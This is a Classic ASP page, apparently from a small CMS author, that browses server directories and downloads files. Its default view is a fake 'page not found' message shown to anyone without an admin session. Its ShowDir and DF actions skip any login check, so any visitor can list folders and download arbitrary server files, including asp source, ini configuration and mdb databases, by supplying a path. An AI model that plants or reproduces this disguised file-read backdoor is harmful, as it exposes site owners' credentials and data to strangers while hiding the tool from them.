<%
'************************************************************
'作者：云端 (精通ASP/VB/PHP/JS/Flash，交流合作可联系本人)
'版权：源代码公开，各种用途均可免费使用。 
'创建：2016-02-17
'联系：QQ313801120  交流群35915100(群里已有几百人)    邮箱313801120@qq.com   个人主页 sharembweb.com
'更多帮助，文档，更新　请加群(35915100)或浏览(sharembweb.com)获得
'*                                    Powered By 云端 
'************************************************************
%>
<!--#Include File="Config.Asp"-->
<%




Dim Fso,F,Fc,MyFile
Dim DefaultDit,NewDefaultFSO,NewStream

DefaultDit="Scripting.Dictionary"
NewDefaultFSO="Scripting.FileSystemObject"
NewStream = "Adodb.Stream"
If ExistsObject("Scripting.Dictionary") = False Then	DefaultDit="Scripting.wang198060Dictionary"
If ExistsObject("Scripting.FileSystemObject") = False Then	NewDefaultFSO="Scripting.wang198060FileSystemObject"
If ExistsObject("Adodb.Stream") = False Then	NewStream="Adodb.wang198060Stream"



Select Case Request("Action")
	Case "ShowDir":ShowDir()					
	Case "DF":DF()								
	Case Else Default2
End Select


Sub ShowDir()
	Dim b,c,d,e,f,g,h,i,j,k,l,m,n,o,p
	b=Request("FileShowType")							
	c=Request("WebPath")										
	d=Request("ShowPhoto")									
	Call HandlePath(c)
	h = ShowRootFile(c)
	If h = "" Then Call Eerr(c & "此目录下没有文件")

	Call Echo(h,c)
	e = Split(h,vbCrlf)
	For f = 0 To Ubound(e)
		g = e(f)
		If g <> "" Then
			k = Trim(Lcase(Right(g,3)))
			p = "|" & k & "|"
			
			If InStr(b,p) Then
				If k = "asp" Or k = "asa" Then
					i = i & g & vbCrlf
				ElseIf k = "jpg" Or k = "gif" Or k = "png" Then
					j = j & g & vbCrlf
				Else
					l = l & g & vbCrlf
				End If
			End If
		End If
	Next

	If d = 1 Then
		If j = "" Then Call Eerr("提示","没有图片")
		h = j
		e = Split(h,vbCrlf)
		For f = 0 To Ubound(e)
			g = e(f)
			If g <> "" Then	
				n = Right(g,Len(g)-InStrRev(g,"\"))
				o = "<a href=?Action=DF&Path=" & g & ">下载</a>"
				m = "<div style=""width:200px;height:120px;float:left;border:1px solid #333333;margin:2px;"">"
				m=m & "<img src='" & g & "'><br>" & n & o &  "</div>"
				Call Rw(m)
			End If
		Next
	Else
		h = i & l & j
		e = Split(h,vbCrlf)
		For f = 0 To Ubound(e)
			g = e(f)
			o = "<a href=?Action=DF&Path=" & g & ">下载</a>"
			If g <> "" Then
				Call Echo(f,g & o)
			End If
		Next
	End If
	Call Echo("","ss")
End Sub



Sub DF()
	Dim b
	b = Request("Path")
	Call DownFile(b)
End Sub


Sub Default2()
	If Session("Administrator")="SuperAdmin" Then
		Call Default()
		Response.End()
	End If
	Call Rw("<title>找不到网页</title>")
	Call Rw("<font color=#333333>找不到网页<p>正在查找的网页可能已被删除、重命名或暂时不可用。</font>")
End Sub
%>



<%

Function Rw(a)
	Response.Write a & vbCrlf
End Function


Function Echo(a,b)
	Response.Write "<font color=red>"&a&":</font>"&b&"<br>"
End Function


Function Eerr(a,b)
	Response.Write "<font color=green>"&a&"</font>："&b&"<br>":Response.End()
End Function


Function JsMessage(a, b)
	Dim c,d
	d = a
	
	If a <> "" Then a = "alert('" & a & "');"
	
	If b = "-1" Then
		c = "<script>" & a & "history.back(-1);</script>"
	
	ElseIf b = "-2" Then
		c = "<script>" & a & "history.back(-2);</script>"
	
	ElseIf InStr(b,"Open=") Then
		b = Replace(b,"Open=","")
		c = "<script>" & a & "window.open('" & b & "');</script>"
	
	ElseIf b <> "" Then
		c = "<script>" & a & "location.href='" & b & "';</script>"
	
	ElseIf b = "" Then
		If a = "" Then a = "点击返回"
		c = "<a href=""javascript:history.back();"">" & d & "</a>"
	End If
	JsMessage = c
End Function



Function ShowRootFile(a)
	Dim b,c,d,e
	Call HandlePath(a)
	Set b = CreateObject(NewDefaultFSO)
	If Not b.FolderExists(a) Then Exit Function
	Set c = b.GetFolder(a)
	For Each MyFile in c.Files
		e = e & MyFile & vbCrlf
	Next

	Set c = Nothing
	Set d = Nothing
	Set b = Nothing
	ShowRootFile = e
End Function


Function ExistsObject(a)
	On Error Resume Next
	Set T=Server.CreateObject(a)	
	Set T=Nothing
	If -2147221005 <> Err Then
		ExistsObject=True		
	Else		
		Err.Clear
		ExistsObject=False
	End If
End Function


Function DownFile(a)
	Dim b,c
	Call HandlePath(a)
	Response.Clear
	Set b = CreateObject(NewStream)
	b.Open
	b.Type = 1
	b.LoadFromFile a
	c=InstrRev(a,"\")+1
	Response.AddHeader "Content-Disposition", "attachment; filename=" & Mid(a,c)
	Response.AddHeader "Content-Length", b.Size
	Response.Charset = "UTF-8"
	Response.ContentType = "application/octet-stream"
	Response.BinaryWrite b.Read
	Response.Flush
	Response.Write("")
	b.Close
	Set b = Nothing
End Function


Sub Default()
	Dim b,c,d
	c = Server.MapPath("./")						
	b = "|asp|txt|ini|mdb|jpg|gif|png|"				

%>
<table width="912" border="0" cellpadding="0" cellspacing="1" bgcolor="#999999">
<form action="?Action=ShowDir" method="post" name="form1" target="Html" id="form1">
  <tr>
    <td width="51" height="24" align="center" bgcolor="#FFFFFF">路径：</td>
    <td width="415" bgcolor="#FFFFFF"><input name="WebPath" type="text" id="WebPath" value="<%=c%>" size="50" />
    <input type="submit" name="button" id="button" value="提交" /></td>
    <td width="347" bgcolor="#FFFFFF">类型
    <input name="FileShowType" type="text" id="FileShowType" value="<%=b%>" size="40" /></td>
    <td width="94" bgcolor="#FFFFFF"><label for="ShowPhoto"><input name="ShowPhoto" type="checkbox" id="ShowPhoto" value="1"/>
    显示图片</label></td>
  </tr></form>
</table>
<%
Call Rw("<iframe src='' name='Html' width=100% height=100%" & "></" & "iframe>")
End Sub
%>


